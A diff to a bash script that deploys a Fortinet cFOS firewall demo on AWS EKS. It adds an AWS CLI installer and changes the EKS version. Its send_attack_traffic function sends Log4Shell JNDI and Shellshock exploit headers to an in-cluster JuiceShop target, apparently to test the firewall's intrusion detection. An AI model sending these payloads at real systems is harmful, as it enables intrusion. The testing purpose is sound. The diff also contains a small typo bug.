@@ -1,5 +1,78 @@
 #!/bin/bash  -e
 
+function install_latest_aws_cli() {
+  # 1. Check system architecture
+  architecture=$(uname -m)
+
+  case "$architecture" in
+    aarch64*)
+      arch="arm64"
+      ;;
+    x86_64*)
+      arch="amd64"
+      ;;
+    *)
+      echo "Unsupported architecture: $architecture"
+      echo "This script only supports arm64 and amd64."
+      return 1 # Indicate failure
+      ;;
+  esac
+
+  echo "Detected architecture: $arch"
+
+  # 2. Check if aws command exists and get its location
+  aws_path=$(command -v aws)
+
+  if [ -n "$aws_path" ]; then
+    echo "Existing AWS CLI installation found at: $aws_path"
+    read -p "Do you want to upgrade the existing AWS CLI installation in place? (y/n): " confirm_upgrade
+    confirm_upgrade=$(echo "$confirm_upgrade" | tr '[:upper:]' '[:lower:]') # Make case-insensitive
+
+    if [ "$confirm_upgrade" != "y" ]; then
+      echo "Upgrade cancelled. Exiting."
+      return 0 # Indicate script exited normally, no error
+    fi
+    install_dir=$(dirname "$aws_path") # Get the directory of existing aws command
+    install_dir=$(dirname "$install_dir") # AWS CLI usually installed under /usr/local/bin/aws, so get /usr/local
+    install_prefix="$install_dir"
+    echo "Proceeding with upgrade in place at: $install_prefix"
+
+  else
+    echo "No existing AWS CLI installation found."
+    default_install_prefix="/usr/local"
+    install_prefix="$default_install_prefix"
+    echo "Installing to default location: $install_prefix/aws-cli"
+  fi
+
+  # 3. Download and install latest AWS CLI
+  temp_dir=$(mktemp -d)
+  trap "rm -rf '$temp_dir'" EXIT # Cleanup temp dir on exit
+
+  download_url="https://awscli.amazonaws.com/awscli-exe-linux-${arch}.zip"
+  zip_file="$temp_dir/awscli-bundle.zip"
+
+  echo "Downloading AWS CLI from: $download_url"
+  if ! curl -s -L -o "$zip_file" "$download_url"; then
+    echo "Error downloading AWS CLI. Please check your internet connection or the URL."
+    return 1 # Indicate failure
+  fi
+
+  echo "Installing AWS CLI..."
+  unzip -qq "$zip_file" -d "$temp_dir"
+
+  if ! sudo "$temp_dir/aws/install" \
+      --install-dir="$install_prefix/aws-cli" \
+      --bin-dir="$install_prefix/bin" ; then
+    echo "Error during AWS CLI installation."
+    echo "Please check the error messages above or try running the install script manually from '$temp_dir/aws/'"
+    return 1 # Indicate failure
+  fi
+
+  echo "AWS CLI installed successfully to $install_prefix/aws-cli and executable linked in $install_prefix/bin"
+  echo "You may need to close and reopen your terminal or source your profile (e.g., 'source ~/.bashrc' or 'source ~/.zshrc') to ensure the 'aws' command is available in your PATH."
+  return 0 # Indicate success
+}
+
 saveVariableForEdit() {
     local region="${1:-default}"  
     local output_file="config_${region}.sh"
@@ -85,7 +158,7 @@ set_common_variables() {
     # Get values from environment or use defaults
     EKSVERSION=$(get_env_or_default \
         "EKSVERSION" \
-        "1.30" \
+        "1.31" \
         "EKS Version")
 
     CLUSTERNAME=$(get_env_or_default \
@@ -281,6 +354,10 @@ check_prerequisites() {
     # Check for required commands
     for cmd in "${required_commands[@]}"; do
         if ! command -v "$cmd" &> /dev/null; then
+		if test "${cmd}" == "eksctl" ; then 
+			echo install latest version of eksctl
+ 			upgradeLatestEKSCTL && break
+		fi 
             missing_commands+=("$cmd")
             echo "❌ $cmd is not installed"
         else
@@ -437,15 +514,20 @@ function send_attack_traffic() {
 echo send attack traffic to juniceshop
 service_address="juiceshop-service.security.svc.cluster.local"
 
+payload='curl --max-time 5 '
+echo run_curl_in_pod "$payload" "$service_address"
+run_curl_in_pod "$payload" "$service_address"
+
 payload='curl --max-time 5 -H "User-Agent: \${jndi:ldap://example.com/a}"'
 echo run_curl_in_pod "$payload" "$service_address"
 run_curl_in_pod "$payload" "$service_address"
 
+sleep 5
 payload='curl --max-time 5 -H "User-Agent: {jndi:ldap://example.com/a}"'
 echo run_curl_in_pod "$payload" "$service_address"
-#run_curl_in_pod "$payload" "$service_address"
+run_curl_in_pod "$payload" "$service_address"
 
-sleep 10
+sleep 5
 payload='curl --max-time 5 -H "User-Agent: () { :; }; /bin/ls"'
 echo run_curl_in_pod "$payload" "$service_address"
 run_curl_in_pod "$payload" "$service_address"
@@ -955,7 +1037,7 @@ deployCFOSandAgentChinaAWS() {
             --set routeManager.image.pullPolicy=Always \
             --set dnsConfig.nameserver="$dnsAddress" \
             --set routeManager.env.DEFAULT_FIREWALL_POLICY=${DEMOCFOSFIREWALLPOLICY} \
-            --set kedaScaling.enabled=$enableKeda \
+	    --set kedaScaling.enabled=$enableKeda \
             --set cFOSmetricExample.enabled=true \
             --set persistence.enabled=true \
             --set initContainers.image.repository=${MYIMAGEREPO}/busybox; then
@@ -1613,6 +1695,7 @@ case "$1" in
         ;;
     installDep)
 	upgradeLatestEKSCTL || exist 1
+        install_latest_aws_cli || exist 1
 	;;
     saveconfig)
         saveVariableForEdit "$2"
